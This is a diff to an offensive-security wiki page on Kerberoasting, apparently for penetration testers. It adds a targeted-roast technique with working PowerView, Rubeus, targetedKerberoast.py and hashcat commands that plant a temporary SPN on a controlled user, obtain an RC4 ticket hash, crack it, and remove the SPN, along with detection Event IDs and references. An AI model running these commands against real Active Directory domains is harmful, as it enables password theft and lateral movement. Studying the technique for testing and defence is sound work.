@@ -155,6 +155,42 @@ Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
 ```
 
+#### Targeted Kerberoast via GenericWrite/GenericAll over a user (temporary SPN)
+
+When BloodHound shows that you have control over a user object (e.g., GenericWrite/GenericAll), you can reliably “targeted-roast” that specific user even if they do not currently have any SPNs:
+
+- Add a temporary SPN to the controlled user to make it roastable.
+- Request a TGS-REP encrypted with RC4 (etype 23) for that SPN to favor cracking.
+- Crack the `$krb5tgs$23$...` hash with hashcat.
+- Clean up the SPN to reduce footprint.
+
+Windows (PowerView/Rubeus):
+
+```powershell
+# Add temporary SPN on the target user
+Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose
+
+# Request RC4 TGS for that user (single target)
+.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4
+
+# Remove SPN afterwards
+Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
+```
+
+Linux one-liner (targetedKerberoast.py automates add SPN -> request TGS (etype 23) -> remove SPN):
+
+```bash
+targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
+```
+
+Crack the output with hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
+
+```bash
+hashcat <outfile>.hash /path/to/rockyou.txt
+```
+
+Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.
+
 You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast
 
 If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:
@@ -233,10 +269,12 @@ asreproast.md
 
 ## References
 
+- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 - Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
 - SpecterOps – Rubeus Roasting documentation: https://docs.specterops.io/ghostpack/rubeus/roasting
+- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
 
 {{#include ../../banners/hacktricks-training.md}}
